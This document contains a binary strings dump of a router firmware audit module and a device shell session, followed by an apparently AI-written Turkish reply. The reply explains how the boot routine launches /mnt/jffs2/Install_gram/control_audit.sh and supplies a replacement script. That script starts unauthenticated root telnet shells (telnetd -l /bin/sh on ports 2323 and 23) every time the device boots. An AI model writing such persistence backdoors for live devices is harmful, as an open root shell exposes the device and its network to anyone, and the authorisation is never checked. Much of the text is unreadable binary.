threadCreateHW_OS_SignalHW_TIMER_StartRealTimerDHW_MSG_DestroyHW_TIMER_ExitHW_OS_GetFileSizeHW_TIMER_InitHW_MSG_SndQuitMainSysMsgHW_MSG_RegisterMIDHW_MSG_MainSysProcLoopEventCenter_GlobalSynInvokeEvent2HW_XML_DBAddObjEventCenter_InitHW_XML_DBApiInitlibhttp_server_base.soHW_OS_ModifyThreadNameHW_OS_PthreadDetachHW_OS_GetRandomlibhw_ssp_http.solibhw_ssp_basic.soHW_TIMER_StopRealTimerHW_OS_PthreadSelfHW_OS_KillAllExHW_OS_ExecShellCmdNoHangHW_OS_CmdEscapeHW_MSG_InitHW_OS_ExecShellCmdHW_OS_ProcSingleOnlibc.so__libc_start_mainlibamp_bll_api.soBLL_GetAccessModeAUDIT_FindInternetRouteWanAUDIT_FindInternetBridgeWanAUDIT_StartOnBootTimeOutFuncAUDIT_NodeSmoothAUDIT_StartDownloadAndRetryAUDIT_AuditDoTaskAUDIT_StartExec_InnerAUDIT_StartExe_FuncAUDIT_RefreshTr069WanAddrAUDIT_OnTr069WanUpHW_CWMP_QoeGetInternetIPAddrg_stAuditTaskEnvAUDIT_GetDownloadURLAUDIT_InitTaskEnvAUDIT_ParseURLStrAUDIT_GetPortFromURLAUDIT_IsPathNeedAddPonModeHW_CWMP_QoeFindInternetUpWanAUDIT_GetServerAddrForDownloadAUDIT_SigProc_start_cAUDIT_IsTaskNeedStartAUDIT_UrlDecodeHW_MSG_AUDIT_Send2SelfAUDIT_IsAuditRunningAUDIT_UpdateMonitorStatusTimeOutFuncAUDIT_UpdateMonitorStatus__bss_start__AUDIT_TaskProcAUDIT_PreprocessForDownloadAUDIT_StartInnerAuditAUDIT_GetProcNameHW_CWMP_QoeGetTr069IPAddrAUDIT_GetIPV6AddrAUDIT_QoeFindIpPosAUDIT_ParseURLHW_CWMP_QoeFindTr069UpWanAUDIT_ResolveIPFromURLAUDIT_OnIPV6InternetWanUpAUDIT_GetDownloadPathAUDIT_UpdateDownloadStatus__end____bss_end__AUDIT_PreprocessCfgInfoAUDIT_TaskProcGetAUDIT_SetTaskBusyAUDIT_GetIpAddrFromWanIndexAUDIT_OnIPV6Tr069WanUpAUDIT_GetProductName__bss_startAUDIT_StartDownloadAUDIT_StopDownloadAUDIT_StartOnBootAUDIT_IsURLPortValidAUDIT_GetAndCheckParaAUDIT_MonitorStatusUpdateTimerAUDIT_AddDefaultAuditObjAUDIT_IsInternetWANOnlyBridgeTypeAUDIT_GetParaFromCfgInfoAUDIT_DownloadProcAUDIT_FreeRes_endAUDIT_InitAUDIT_SetAttributeValueHW_CWMP_RPC_GetAuditParaAUDIT_StartProcAUDIT_TestAndSetTaskBusyAUDIT_SysMsgProc_edataAUDIT_StartMonitorWanbin_InnerAUDIT_GetCfgParaFromDBAUDIT_PdtDownloadAUDIT_GetBinFilePathHW_CWMP_RPC_SetAuditParaAUDIT_GetTaskEnvAUDIT_GetProClassEXTXPONAUDIT_OnInternetWanUpAUDIT_CheckAuditParaValidso.ld $%zN� $%zN� $%zN� $%zN�$%zN�
                                             �
�␦��"�dhlpt|    �                             ���
�
 �
  �������������␦��� �!�#�$�%�&�'�(�)�*�+�,�-.0
                                              12345 6$7(8,90:4;8<<=@>D?H@LAPBTCXD\E`FdGhHlIpJtKxL|M�N�O�P�Q�R�S�T�U�V�W�X�Y�Z�[�\�]�^�_�`�a�b�c�d@-�@���/��-�������Ə�ʌ����Ə�ʌ����Ə�ʌ�
                                                             ���Ə�ʌ����Ə�ʌ����Ə�ʌ����Ə�ʌ����Ə�ʌ����Ə�ʌ����Ə�ʌ����Ə�ʌ����Ə�ʌ����Ə�ʌ���Ə�ʌ���Ə�ʌ���Ə�ʌ���Ə�ʌ���Ə�ʌ���Ə�ʌ���Ə�ʌ���Ə�ʌ�|��Ə�ʌ�t��Ə�ʌ�l��Ə�ʌ�d��Ə�ʌ�\��Ə�ʌ�T��Ə�ʌ�L��Ə�ʌ�D��Ə�ʌ�<��Ə�ʌ�4��Ə�ʌ�,��Ə�ʌ�$��Ə�ʌ���Ə�ʌ���Ə�ʌ�
                                   ��Ə�ʌ���Ə�ʌ����Ə�ʌ����Ə�ʌ����Ə�ʌ����Ə�ʌ����Ə�ʌ����Ə�ʌ����Ə�ʌ����Ə�ʌ���Ə�ʌ���Ə�ʌ���Ə�ʌ���Ə�ʌ���Ə�ʌ���Ə�ʌ���Ə�ʌ���Ə�ʌ�|��Ə�ʌ�t��Ə�ʌ�l��Ə�ʌ�d��Ə�ʌ�\��Ə�ʌ�T��Ə�ʌ�L��Ə�ʌ�D��Ə�ʌ�<��Ə�ʌ�4��Ə�ʌ�,��Ə�ʌ�$��Ə�ʌ���Ə�ʌ���Ə�ʌ�
       ��Ə�ʌ���Ə�ʌ����Ə�ʌ����Ə�ʌ����Ə�ʌ����Ə�ʌ����Ə�ʌ����Ə�ʌ����Ə�ʌ����Ə�ʌ���Ə�ʌ���Ə�ʌ���Ə�ʌ���Ə�ʌ���Ə�ʌ���Ə�ʌ���Ə�ʌ���Ə���D1��0�-� ��<A���L� �M�@��0����0��0�T��Ə�ʌ�L��Ə�ʌ�D��Ə�ʌ�<��H!��
                                     �0������PP�

��Y
   �u�!�����0�� ��0�� ��0 3�4
9����������h������0�K�������+����00K�����������@P�
�����������P�������� �������@P�|������␦������i���Y���@P�\������␦�����@P�
�����������s������K�0������UX�X��7U�3U0U5U���������
     Р���D��� ��0@-�
                    ���8��
                          �M�4��P��00��@��0����P��������������
                                                              Ѝ�0������,��,0����( ��0��S� ���/0��0��S��/�/�p�h����8��80����4 ��0��C� ��A��������/0��0��S��/�/�,�$�\��h0��@-�0��`@��0��@��S���P0��0��S�
D0����t�������80��0��S�
,����A���$0�� ��0�� �������������Z��40��4 ��0��0��S�
����0����-�`�� ���L��M� ��@��P��0����0�� 0
                                          �0��0��(0
                                                   �$0
                                                      �0��0��(K�h���$K�p�������0��
                                                                                  ␦(0S�
$0S�␦��E���P�0�0�@�0 ���� 0�� ��0�� �� 0 3�
����0����-�`��� ���L��M� ��@��P��0����0�� 0
                                           �0��0��(0
                                                    �$0
                                                       �0��0��(K�1���$K�p�������0��␦(0S�
$0S�    ␦�����P�
������P�0�0�@�0 ���� 0�� ��0�� �� 0 3�
�����-��L�@��P��`�������P�␦�����P�0�0�@��␦0��0������
���0���-��M��L0��0��0��0�� ����
                               ��������
��� ���-����M� ��0���L��0��0��0������  �K����=F
���1�� ��0�-��L�@P��M�0���s          �K����     F�!��
0��0
    �0��0�� 0
             �
d����C���P�
           ␦ z
�������D!��81�� ��0�� ��0 3�E
����$������'���P����␦Q��P����������0�� ��p��d���P�
�
����
]����u����� ��0���������V���P�
�
����L����g����� ��0������'��H���P�
�
����x@��@�������0��V���P�␦K�@�� ��J�
����-����L�����P�                   @!�������@ ��0����K� ���������K�0���@���E��E��4�����p10��
�������
�����-��L��M�p��[��P��@�����]��`�������/o�"��0��o�����  R��0��S����␦/S�S0�0�#��/�
@��:�������P�␦/�������P�␦����������/o�T��@��0�@����@��@��"����������K�����`�`�0����
�����-�����"�����2���L� ��pK��M�0��P��`���� ����0��00
                                                     �0��������0��Y�U�0
                                                                       �0
                                                                         �
X�␦?o�2��0�V�0�S�
H2��� ��D��0��P����*������+�,���������@P�/
0D���S� ����0������P�
������������P����������@��/����<���`P�␦�1��� ����@��0��������1��� ����*��0���������!��h1�� ��0�� ��00 3�Q
����p!��0������ ��@��R�������PF� ��U���P�#��0��X���P�
������,0K� K�P��K���0��0E�E���PP�
������������:������@P�
P����%���P�␦�0��� �����@��0����������������+K���        ��0C����P�
�s���������7�����0��V��`� �����P�����
�����-����� ��p���0���L� ���M�P��$K�0��`��0��(0����/��
                                               �0��0�0 �����@P��c
                                                                 @�� ����0����,����@P�
,�����m����h ����\0�� ��0�� ��(0 3�
������,0 ����c���@P�,
�����-�@�����L�`��p��������P���
��������PP�

0��␦�������P����
����a���PP�␦�������PP����␦����������������R���PP��*���
����0�� ��p�-��L�$�M�0��4@K�`�� ��0�� 0
                                       �0��0����P���������80K� ����>���@P�
��N������
�@0�� ��0K�
��,���P����␦U��������, ��$0�� ��0�� �� 0 3�
����0�� ��0�-��L��M�0��@��P��0��0
                                 �0��0�� 0
                                          �0
                                            ����P�
�������@P�
����w���@��| ����p0�� ��0�� ��0 3�
:��� K��� K�����@P��␦ @ ����0������@P����
�����-�P��\@���L�`��@����1���
V���0��
       ␦{���@��0������?���T�
�������-�P��!��p��1���L� ��,�M�@��0����0��(0
                                            �0���K��������@K�P�␦|����b���@Q�␦h�������@��\!����D1�� ��0�� ��(0 3�H
����8��������< K���
���`P� �����
�K����@P�
������������<� ��
X�␦8`K�0���� �������@0�� �����p���P����␦@ ��.����������R������
0���� ����`��0������ ��6o������=���`0��`��/.��P��0����@��*�����T���
���1�� ����-��L��M�PP�0��0�� 0�l��� �K:e9�!��
                              �0��0��$0
␦p������dA��d!����T1�� ��0�� �� 0 3�L  �
h���$K�K���@P�
0!����␦��������@����$0��!��h���@P�
$������#��������$0�`���p�@��T�␦$��������0��S�
�� ��S�
 @������S�0�0����
� ��S����␦���0�� ����
                     ���P�5���
a�������@��?0�� ��A�����P�?���
����@��?0�� ��Q������P����
����-��L0��0��0���0� ���� ������P��{�
���1����-�p����@��/o�Q����L�"��j�M� �R�0��P��0�� 0
                                                  �0��␦moK�e?������
���
␦@��T�S�
␦$�� �0���0����0��0�������������j���P�  ␦��� ���0�� ��0�� �� 0 3�-
��������

        �@P�

�0���/����*��0����������������������������P�␦0��S�����p0��#�l��*��`��0������� �������������D���������P����
���1���� ����0�-��L�(�M�0��!��0��0
                                  �0��0�� 0
                                           � 0K�$
                                                 �
                                                  ����@P�
                                                         ␦ 0S␦P1���/��L��*��0����v������K�K���@P�

���������!��1�� ��0�� ��0 3�7
W��� K�P��0�����0"�$�� ��@��,����0�P�� ��0��P��0��0����@��!���@��
��������m���������$0K���0����0��X ������@P�
���0�-��L����@P��������P�������@������������K�0���p��&06�4����&�;&��'��55
���3�� ����-�B�M��L��M�0��p��@��0��00#��
                                     �0��B>K�
                                             0C�,��PC���4t
                                                          ���<4
                                                               �/���T�
                                                                      ␦���9����"��2�� ��0�� ��00 3�
����b��`�����   ������$0��S�    ␦       ������x2��x��A$�0��*������������        �����$�������3>K�84
                                                                                                   �<�� ����8����#�K�,��8���K�\���<���� ��
������,��
����S���<���� ��        ���������,��    ����I��������q�������P�"␦84W�!����Pp���0�� ��
                                                                                     p��00����f��� P��Z�)ڀ1��k$�|��*��0��P�������h��������������P�(
u����@��.�@������{���P�␦W�1�$!����p�84 ��
                                         p������0��00��<��� P������b����}����f�����0�����g$�@��0����*��a���q���<4�C��������|0�� ��0�-��L�M�PK�0��@��0��0��K��h��2���`�� ������S�����$p��(@��g���S���(�K���D�� �����!4224�2u3�3
                                �0�@%���������D ��<0�� ��0��P�@o�� ��0 3�
���0����0�-� ���L�H�M�X@K�0��P��@ ����0��0
                                          �0�����U�␦h ��?0��@���� �����0�� ��L��L�����@ ���������8 ��$0�� ��0�� ��0 3�
�����-�p��P!��`��L1���L� ��0PK�(�M�0��@���� ����0�� 0�������� ������ ��W����� P��������K��h��x����Y0Y-
                                                     �0��8
                                                          �4
��������@��� �����0�� ��0�� �� 0 3�2                        ����V�
a�����0��� ��������@P�
� ����
      ��w�������40K� ��0����80K���0��0��s���P�␦80S�␦D���h���p��������P�␦����;
�0�� ��@�������@P�
����-����L����P������K���T�� ���&&Q,(��
����-����L�����P␦d0��,%�`��*��0����
                                   �K�h�����H����P���@����M���8����J���0����G���(����
���p�-��L�@��                                                                        �K�h������-}.%+�.�.�.�-�.
             �M�@�������� ��P�
C��� �����0�� 0��@��@�� ��`��^���P�������p0��
                                              ��}��0��0��`0�� ��0��C���P��
����-����L�K���P�␦�����������������K�ph������K�p�������*����8��
���0�� ���-��L�M�0��0��0�0�� ��S�@���@���������0��踿��� ��
                        �0������P�
T ��0����K� ������P�
��i���0 ��$0�� ��0�� ��0 3�
q���
�����-��L�M�p��d������P���`��@��P��`��<����]���(0��S�
@T�

���0���%�*����@��\���}�����$0��S����␦P���P��l`��`����\���0��T�(@�T@��$0��@����l���(0��@��,��*��0����$0��0��(0��0��=���������-�0���L�(0��S�T0��

8 �� ��0��0��0�����$ ����#�
����0���� ��0�-��L�b�M�0��P��a/��0��0 �� ������Ľ,"&�+0��0��(0��S�␦M���������\�� ��
␦��R����@�� ����x0�� ��0�� ��0 3�    �0��g?K���9���j���@P��N#␦�1S�
������fK�#�@P��W
                ␦D����k���P����␦�������@P����
���1����0�-� ���L�f�M�k_K�0��e/����0��0
                                       �0���������c��������f����0�����z&�0��*������������P�␦����� ��0���� ������� ��0���� ������� ��h0�� ��0�� ��0 3�
���0���� ���-��L�$�M�0��@���� ��0��08��r��������R���m��������K�0���D��_*U*�%*"&-"���,� ��
                                    �0��0K� @
                                             @#�0�� 0K�0��0��z���  ������� ��0P�P��@B ��Oo��B�r���8 ��(0���� ��0�� ��0 3�
����0�� �����-��L��M�0�� K���@��0��0
                                    �0�� @
                                          �@
                                            ������K������ 0x��*���&�0����00��`0��0�����0S��␦ P��< ��$0�� ��0�� ��0 3�
���$2�� �� ��0�-��L��M�0����0��0
                                �0�����P�␦���������P�@��␦����������q������!��1�� ��0�� ��0 3�e
����i���P�����
�����g���P�␦����P�␦|!��0��x�� ��t�����p!��0��l�� ��\�����`1��`��r.��0����*����������HA��@��0�����P␦��%�����(1��(��&'�0��������P�������,0��S�␦�����������0��,0������     ��������K�<P������0��d��$ ��0��0��0��0���0��@������@��
I���0����0
����1�� ��0�-��L��M��Q��0��P��@��0��0��B'���*��}�������K�0���4���"�'�'ȶ�"�&"&�)"E'�!�='�!!�����&� �!��
                                     �0���1����a'�0����*��P���T�4␦���������P�␦���P�␦�!��0���� ����)���!��0���� ��t��#���x1��l'���0��*��4������\����0�����P�␦��r�O�������8!��0����K� ��s���$!���0�� ��0�� ��0 3�3
���T����␦������������P�
���     ����p����@��@������� ��P�
Y��� �����0�� 0����@����@�������0�� ��d��d������0�� ��\��P���������t0��'���*��0������`����&��������K�0��谴�5 /&� �$"&�"�%ȵX�����eE"4���&�$
���L1����-�p��D!���L�m_K�␦�M� ��@��`��0������ ��0�� 0
                                                     �0������i?K�a/����������T�
                                                                               ␦������������� ���0�� ��0�� �� 0 3�-
��������0�� ������@P�
�������������1S�␦����P�␦������,�������d�����@P���
������k���D �����������������␦���P����
���p�-��L�PA���D� ��&
�␦��������P�␦����(���P�@�␦����������u������K�p�������P����
���v���P�����P��00��@��0��0����0��=���,0��S�␦2�������)���P�␦|0��(���*��0��/���������������
�����P����
���p�-��L�LA���꼲QG!�"��"�"
              �M�`��@��P�������0����a���@����'���T��␦
                                                     �������P�␦���������P�@�␦�����������������K�p���s���P����
�P���(�@��*��P��00��@��0��0����0������,0��S�␦������������P�␦x0���(���*��0������������e�����������P�����
��\���P����
���P1����-�0��HQ���L���M␦8!&!
                     �M�@��P��)������*�������-���P�"␦��f���P�p��␦a��`�����0���  ������
��&���@��       �����T��␦       #␦���P�

�0��#)������0��*�����,0��S�␦w�����(�K���l���P�␦x0��,)���*��0��r���������        �����P������P�␦��6      ��������������P����
���L1����-�0��DQ���L��� qp�X �
                     �M�@��P��.�������*��I���������P�"␦��
���P�p��␦�`��`�����0��� ��F����
�����@��        ��X���T��\      #␦����P�

�0��e)������0��*��&���,0��S�␦����(�K������P�␦t0��n)���*��0��������������������]���P�␦��x        �1������������P����
���0�� ���-��L��M�@��K�0����0��0
                                �0��0���0!�V���P�@�
��w���@��T0��:(�P��*��0��@��������< ��(0���� ��0�� ��0 3�
�����K����
���0�� ���-��L��M�@��K�0����0��0
                                �0��0���0!�#���P�@�
��D���@��T0��\(�P��*��0��@�������< ��(0���� ��0�� ��0 3�
���d1�� ����-��L�D�M�0��` K�0��(0
                                 �0��@1��p��0��8���0���S������
                                                               �����␦����       ���P�␦��        ����������B���P����
�P��P��@����w���,0��S�
␦������ ��0�� ��0�� ��(0 3�!
Q�����`��,`��}�������P���       ���
�����P���       ���␦h����
���������`P�
����2������-� ���L�[�M�C~K�����*��%�����0���X�������P�␦H0���)�D��0������������T�P�0�$0���)� ��0��������oe�L-4�"��
                           �M�#�K�0��@��,����0��00
                                                  �0��/�����,����E
                                                                  �*���3>K���,�����5
                                                                                    �$���MK�3���
                                                                                                @D��P�
0��l���5
        �*�d2����0��*������ ����J�!���D"��42�� ��0�� ��00 3�
����[nK� R��
            `F�e?��F���
 ��P��  ������  ��p�����P����
                             �

���������1�����.��0��������,�����4�H���,���B��D�����    �������0P��5
                                                                    �␦Z�!������
0�P0�
     0�� ��p1����0��0���50��00��]��� P�'��5����0��������4��     ��������P�␦Z�!�����0�
0�
  0����1��!��0��0���5 ��0��00��>��� P������*
������0�� ��0�� �����������������P����
                                      �
�0��<
� ��0�� �����~�����
                   F������P��
                             ����␦�5S����
 ����J�������r���(�K���,��=��
���0�� ������������������P�'␦���7Z���x��,��
����������������@�����
                      �@����{���������������P�0��␦9���P�
���@0�� ������0�����p������␦���^����K�0h������T�����]���H�����������������6"&"��������@�
����0����p�-� ���L��P��t@K�d�M�P��0����T ��`��0�� 0                                     �����������\���� ��
                                                   �0�����0�� �� ��LK�x`
                                                                        ����0�� �� ��pK�,`
                                                                                          ������ ��0��xK�P`
                                                                                                           �(
                                                                                                             �����@P�
��������4 ����$0�� ��0�� �� 0 3�
����-��L�p�����ԡ
���0���-��M��L0��0��0��0�� ����
                               �������
��� ���-����M� ��0���L��0��0��0�����  �K����5
���81�� ����-��L��M�(PK�0��p��:��0�� 0����<!��
                                      �0��0��(0
                                               �0������P���
0��S���␦
@����=���/��`��������� ��P�`@��V�0�10�#���`P��'�␦��-���P�@��
��,�����@��d ����X0�� ��0�� �� 0 3�
���h1��p�-� ���L�C�M�^K�0��@��,��`������0�� 0����l!��
                                             �0��L��� ������}=��$1
                                                                  ����@P�

��D��~���!�����0�� ��0�� �� 0 3�4
���������������@P�

@���������� ��0�������P��N�␦:����|���@P�
IK���j���0��0��/����r���d ���� ��@P���0�0����� ����������@P�$11����
��b��B���@�������K�p��蠟�0�*
                            �
�����-�`������L��M���@��E���P�

�������PP�
��t��&����� �K���>�� ��0����>�������P��p�␀��0� ���������P��
����0�� ��p�-��L����� ��}����>��0��1�� ��,��*������0��0��`��0���������� qY)Q��
                 �M�P��K�0��`��0�� 0
                                    �0��
                                        0�0 �g���@P�

�������� ����|0�� ��0�� �� 0 3�
F���$0S�␦X �� ������\�������S�@ � ����
���(1�� ����-��L�\�M�0��p�� ��K�p�����������,!��
                              �����0��(0
                                        �0�����PP�
�������@��� �����0�� ��0�� ��(0 3�+
������@P����
l`K�A ����tP
            ���pP
                 �E���t0K� ����0��*��p0K�0��0����P�
@������p0S����␦A�������@P����␦ ��������@P����
���1��P� ����-��L�K�M�0��P�p��0��00
                                   �0��H
                                        �o���P�U�
X�����D���LA��L!����<1�� ��0�� ��00 3�F
�����K�A ���������A������@P����
␦��K���A ��     ������  ������@P�
�����!�������`K�t�K���A ����������A ��
��������#�����
���l1����-�P��d!���L��M� ��p��`����0��:��0��(0��������@�����80��        !�4��*��p��0����{������(�K��蠚� �D���
                                              �0��0��,0
                                                       ������P�
,K�������@P��2␦@��/�������� ��`F�oo�b���P�0�0�<������^���,0S�`�V�
� ����0��0�� ������� P����'����@�� ����t0�� ��0�� ��(0 3�
��� ������8���@P�
���(1����-� ���L��M�^K�0��@��,��p������0�� 0� �K���И��q
                                            �0��7��`������ ����@P��?-␦�0��B!����*��0��P������������������@P�
@�������� ����0����|���P�
��I�P���@��d ����L0�� ��0�� �� 0 3�

���� ������V���@P����
����<��������K���L���
�����-����H!��P��D1���L� ��moK�c�M�0����������a/����0��00
                                                         �0��p�����������@P�
b�� ����������� ���0�� ��0�� ��00 3�.
����0��� ��
��      ��F���@P�
� ����i������������������P���
                             ␦��p���@P�
�����l ����q�����\����������T��� �����a���@P����
�����( ����_������(�K�����'����& �@-�@���/�AUDIT_MonitorStatusUpdateTimerAUDIT_StartOnBoothw_tool_audit.cFT_CWMP_NODE_AUDIT_PLUGINX AUDIT_PLUG FileInstallGram.exeHW_SSMP_FEATURE_MNGT_GXCTAUDIT_ParseURL::pcUrl=[%s]://AUDIT_ParseURL::invalid2httpAUDIT_ParseURL::pcTemp=[%s]ipv6FT_CWMP_AUDIT_ON_INTERNET_WANAUDIT_GetServerAddrForDownload::Audit download server IP address %sAUDIT_TaskProc::Resolve para fail.HTTPHTTPSAUDIT_CheckAuditParaValid:: error: acProtocol=[%s]CMO_X_AUDIT_PLUG_OBJ  HW_XML_DB_EXISTED_E!

SmoothAudit Success!
Data smooth for CMO_X_AUDIT_PLUG_OBJ failed!
AUDIT_StartDownload::Audit is downloading, quithttpc -g -B %s -R %s -l %s -r %s -P %uAUDIT_StartDownload:: error: acProtocol=[%s]AUDIT_StartDownload::
cmd=[%s]
rm -rf /tmp/QoE/monitor.wan.binAUDIT_StartDownload:: State - [%u], Result - [%u]RunningAUDIT_UpdateMonitorStatusTimeOutFunc::Audit Process stopcd /tmp/QoE/;./monitor.wan.binAUDIT_StartExec_Inner::BinFile Not Exist!rm -rf /mnt/jffs2/Install_gramtar -xzf /tmp/QoE/monitor.wan.bin -C /mnt/jffs2/chmod +x /mnt/jffs2/Install_gram/*cd /mnt/jffs2/Install_gram;./control_audit.sh --startAUDIT_StartDownloadAndRetry::Download retry times left [%d]AUDIT_StartDownloadAndRetry::Audit Download state:[%u], result:[%u]
SuccessFailAuditTaskAUDIT_TaskProc::Audit Task thread startsAUDIT_IsInternetWANOnlyBridgeType::r=[%u],B=[%u]/mnt/jffs2/Install_gram/control_audit.shAUDIT_StartOnBoot::no need to download
AUDIT_StartOnBoot:: not support to download from bridge wanAUDIT_StartOnBoot:: cancel, TR069 WAN Addr NOT availableAUDIT_StartOnBoot::Audit Task will start in [%u] secondsAUDIT_AuditDoTask::AuditEnable = %uAUDIT_AuditDoTask:: not support to download from bridge wanAUDIT_AuditDoTask::Audit stop the gram/mnt/jffs2/Install_gram/control_audit.sh --stopAUDIT_OnTr069WanUp::no need to download
AUDIT_OnTr069WanUp::TR069 WAN Addr %sAUDIT_OnInternetWanUp::Audit is running ,no need to download
AUDIT_OnInternetWanUp enter
AUDIT_OnInternetWanUp::Internet WAN Addr %sAUDIT_OnIPV6InternetWanUp enter
AUDIT_OnIPV6InternetWanUp::Internet WAN Addr %sAUDIT_OnIPV6InternetWanUp::Audit is running ,no need to download
HW_CWMP_QoeGetTr069IPAddr::uiRet=[%u]
HW_CWMP_QoeGetInternetIPAddr::uiRet %u
 [AUDIT_StartInnerAudit] execute inner monitor.wan.bin!!!
cd /mnt/jffs2/Install_gram/; ./control_audit.sh --starterror: pcUrl = null!error: no protocal!error: AUDIT_UrlDecode
 Audit is running, can not update!
 AUDIT_DownloadProc::Resolve download server address fail.auditAudit regist msg failed: uiRet = 0x%x
Audit msg failed: uiRet = 0x%x
Audit DB init failed: uiRet = 0x%x
[Audit]: MainSysProcLoop error[0x%x].
hw_tool_auditmore.cAUDIT_UrlDecode::Resolve para fail.AUDIT_UrlDecode--url=[%s];
protocol=[%s];addr=[%s]|ip=[%s];port=[%u];acRemotePath=[%s];-GPON-EPONFT_PRONAME_WITHOUT_ETHERNET-Ethernet/HW/%s/%s/%s/monitor.wan.binHW_CWMP_GetQoeDownloadPath:: %s%s:%uAUDITPreprocessCfgInfo:: RPC SET Download URL = %sF������F������F������F������B������B������D������B������F������I������D������G������F������E������D������F������G������F������B������F������D������D������I������D������F������D������D������F������F������B������B������E������B������D������B������F������B������D������D������C������C������D������D������F������E������E������I������I������C������C������G������D������I������D������E������B������D������B������B������F������E������G������B������E������G������I������G������F������I��������`��`��ئ�����d������4������4��������������8������������������������������������������X�����@�����H������P�����������������@��������������x�����l�����8�����t�����@����������`���������������<����������������������������������T�����,����h��������D��
                                                                                                              ��L��������������
       ������� ��������������L�� �����$����(��|��,�����0��\��4�����8�����<��H��@�����D��x��H�����L����P����T����d��P��h�����l�����p��P��t��X��x��x��|��l�����������d�����������0���������000���_p���    �1Sc����
�y�                                                                                    $)
   ␦�
     L���o@h�
T
 \�<&�%������o,%���o���o�#����
                              0)0)0)0)0)0)0)0)0)0)0)0)0)0)0)0)0)0)0)0)0)0)0)0)0)0)0)0)0)0)0)0)0)0)0)0)0)0)0)0)0)0)0)0)0)0)0)0)0)0)0)0)0)0)0)0)0)0)0)0)0)0)0)0)0)0)0)0)0)0)0)0)0)0)0)0)0)0)0)0)0)0)0)0)0)0)0)0)0)0)0)0)0)�y�-$)� G�L� G�[����A.aeabi$7-A
A       ␦".shstrtab.interp.gnu.hash.dynsym.dynstr.gnu.version.gnu.version_r.rel.dyn.rel.plt.init.text.fini.rodata.ARM.extab.ARM.exidx.eh_frame.init_array.fini_array.dynamic.got.data.bss.ARM.attributes
                                                                                44LL����o@@�
                                                                                            �
                                                                                             %hhT-���o�#�#p:���o,%,%�I �%�%R    B<&<&[$)$)
                  V0)0)pa�-�-Lg�y�y
                                   m�y�y�
                                         ux�x�<�p�����p
                                                       �$�$���
                                                              ����
                                                                  ����
                                                                      ���\\�������p�/K��WAP(Dopra Linux) # cat /bin/hw_restore_manufactory_exec.sh | head -30
#! /bin/sh

var_default_ctree=/mnt/jffs2/hw_default_ctree.xml
var_default_ctree2=/mnt/jffs2/hw_default_ctree2.xml
var_etc_def=/etc/wap/hw_default_ctree.xml
var_etc_boardinfo=/etc/wap/hw_boardinfo

var_ctree=/mnt/jffs2/hw_ctree.xml
var_ctree_bak=/mnt/jffs2/hw_ctree_bak.xml
var_rebootsave=/mnt/jffs2/cwmp_rebootsave
var_oldcrc=/mnt/jffs2/oldcrc
var_oltoldcrc=/mnt/jffs2/oltoldcrc
var_precrc=/mnt/jffs2/prevcrc
var_oltprecrc=/mnt/jffs2/oltprevcrc
txt_boardinfo=/var/dup_boardinfo
var_boardinfo=/mnt/jffs2/hw_boardinfo
var_boardinfo_bak=/mnt/jffs2/hw_boardinfo.bak
var_boardinfo_dec=/var/decrypt_boardinfo
var_boardinfo_temp=/mnt/jffs2/hw_boardinfo.temp
var_bms_prevxml_temp="/mnt/jffs2/hw_bms_prev.xml"
var_bms_oskvoice_temp="/mnt/jffs2/hw_osk_voip_prev.xml"
var_ftcrc_temp="/mnt/jffs2/FTCRC"
var_ftvoip_temp="/mnt/jffs2/ftvoipcfgstate"
var_dhcp_temp="/mnt/jffs2/dhcpc"
var_dhcp6_temp="/mnt/jffs2/dhcp6c"
var_DHCPlasterrwan1_temp="/mnt/jffs2/DHCPlasterrwan1"
var_DHCPlasterrwan2_temp="/mnt/jffs2/DHCPlasterrwan2"
var_DHCPlasterrwan3_temp="/mnt/jffs2/DHCPlasterrwan3"
var_DHCPlasterrwan4_temp="/mnt/jffs2/DHCPlasterrwan4"
var_DHCPstatewan1_temp="/mnt/jffs2/DHCPstatewan1"
WAP(Dopra Linux) # cat /bin/restorehwmode.sh | head -30
#! /bin/sh

#set hw parameters
#copy etc/wap/hw_default_ctree.xml to /mnt/jffs2/hw_ctree.xml
#set the spec para
var_pack_temp_dir=/bin/
login_user=`eval echo \`ps | grep "Get username"\` | cut -d " " -f 2`
if [ $login_user != "root" ]; then
    echo "restorehwmode.sh failed !!!"
    echo "Using : sudo restorehwmode.sh"
    exit 0
fi

if [ -f /etc/wap/DebugVersionFlag ]; then
    if [ -f /mnt/jffs2/RestoreHWExecTime ]; then
        var_lineCount=`cat /mnt/jffs2/RestoreHWExecTime | wc -l`
        if [ $var_lineCount -gt 10 ]; then
            rm /mnt/jffs2/RestoreHWExecTime
        fi
    fi
    date "+%Y-%m-%d_%H:%M:%S" >> /mnt/jffs2/RestoreHWExecTime
fi

#���flash��boardinfo�Ǽ��ܵ�����ܸ���
if [ -f /bin/decrypt_boardinfo ]; then
    if [ -f /mnt/jffs2/hw_boardinfo ]; then
        decrypt_boardinfo -s /mnt/jffs2/hw_boardinfo -d /mnt/jffs2/hw_boardinfo
    fi
    if [ -f /mnt/jffs2/hw_boardinfo.bak ]; then
        decrypt_boardinfo -s /mnt/jffs2/hw_boardinfo.bak -d /mnt/jffs2/hw_boardinfo.bak
WAP(Dopra Linux) #



Tüm puzzle çözüldü! `audit` binary'sindeki string'lerden tam mekanizma:

```
1. AUDIT_StartOnBoot → ssmp boot sırasında çağırır
2. Kontrol: /mnt/jffs2/Install_gram/control_audit.sh var mı?
3. Varsa: cd /mnt/jffs2/Install_gram; ./control_audit.sh --start
```

**Patch'in çalışmama sebebi**: Dosyayı `/mnt/jffs2/control_audit.sh` yazdık, ama sistem `/mnt/jffs2/Install_gram/control_audit.sh` arıyor.

Şu an bu canlı cihazda hemen test edebilirsin:

```sh
mkdir -p /mnt/jffs2/Install_gram
```

```sh
cat > /mnt/jffs2/Install_gram/control_audit.sh << 'EOF'
#!/bin/sh
LOG="/tmp/payload.log"
echo "$(date) control_audit $1" >> $LOG

case "$1" in
  --stop)
    killall -q telnetd 2>/dev/null
    ;;
  *)
    # Telnetd root shell - high port (no root needed)
    telnetd -l /bin/sh -p 2323 2>/dev/null &
    # Also try privileged port if we have permission
    telnetd -l /bin/sh -p 23 2>/dev/null &
    echo "$(date) telnetd started" >> $LOG
    ;;
esac
EOF
```

```sh
chmod 755 /mnt/jffs2/Install_gram/control_audit.sh
```

```sh
ls -la /mnt/jffs2/Install_gram/
```


WAP(Dopra Linux) # ls
bin      etc      lib      mnt      sbin     tmp
boot     html     libexec  proc     share    usr
dev      init     linuxrc  root     sys      var
WAP(Dopra Linux) # mkdir -p /mnt/jffs2/Install_gram
